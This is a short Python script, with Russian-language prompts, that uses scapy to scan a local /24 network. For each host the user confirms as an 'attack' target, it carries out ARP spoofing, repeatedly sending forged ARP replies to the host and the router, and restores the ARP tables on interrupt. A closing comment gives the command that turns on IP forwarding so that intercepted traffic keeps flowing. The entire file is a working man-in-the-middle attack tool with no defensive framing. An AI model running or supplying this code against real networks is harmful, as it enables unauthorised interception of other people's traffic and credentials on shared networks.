#!/usr/bin/env python
import scapy.all as scapy
import scan
import time

def getResScan(routerIp):
	for item in scan.scan(routerIp + "/24"):
		inChoice = input("[!] Атаковать хост " + item["ip"] + "/" + item["mac"] + " (y/n?)")
		if inChoice == "y":
			try:
				dot = " "
				while True:
					spoof(item["ip"], routerIp, item["mac"])
					spoof(routerIp, item["ip"], item["mac"])
					if len(dot) >= 5:
						dot = " "
					else:
						dot = dot + "."
					print("\r[*] Отправка пакетов" + dot, end=" ")
					time.sleep(2)
			except KeyboardInterrupt:
				print("\n[!] Востановление ARP-таблицы")	
				restore(item["ip"], routerIp, item["mac"])
				restore(routerIp, item["ip"], item["mac"])
				getResScan(routerIp)
			
def spoof(targetIp, routerIp, targetMac):
	packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp)
	scapy.send(packet, verbose=False)
	
def restore(targetIp, routerIp, targetMac):
	routerMac = " "
	for item in scan.scan(routerIp):
		routerMac = item["mac"]
	packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp, hwsrc=routerMac)
	scapy.send(packet, count=4, verbose=False)
	
routerIp = "192.168.1.1"#вынести как аргумент
getResScan(routerIp)

#echo 1 > /proc/sys/net/ipv4/ip_forward	
